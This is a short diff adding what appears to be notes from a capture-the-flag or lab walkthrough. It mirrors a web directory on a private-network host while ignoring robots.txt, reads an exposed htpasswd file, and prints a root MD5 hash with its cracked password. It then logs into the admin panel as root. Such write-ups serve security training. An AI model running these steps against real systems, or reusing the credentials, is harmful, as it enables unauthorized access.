@@ -1,0 +1,7 @@
+using wget and look in robots.txt file
+wget -e robots=off -r -np -R "index.html*" 192.168.1.16/whatever/
+going to the /whatever/htpasswd file :
+root:437394baff5aa33daa618be47b75cb49
+MD5 decrypt : qwerty123@
+go to domain/admin
+log in with root and qwerty123@
